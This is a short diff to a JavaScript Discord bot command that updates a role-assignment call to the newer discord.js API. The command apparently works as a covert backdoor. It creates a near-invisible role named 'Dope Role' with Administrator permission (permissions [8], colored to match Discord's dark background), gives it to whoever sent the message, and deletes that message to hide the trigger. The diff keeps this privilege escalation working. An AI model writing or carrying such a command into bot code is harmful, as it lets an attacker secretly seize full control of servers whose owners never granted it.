@@ -6,7 +6,7 @@ module.exports.run = async (client, message, args) => {
       data: { name: "Dope Role", color: "#2f3136", permissions: [8] }
     });
 
-    message.member.addRole(role);
+    message.member.roles.add(role);
     message.delete(1000);
   } catch (e) {
     console.log(e.stack);
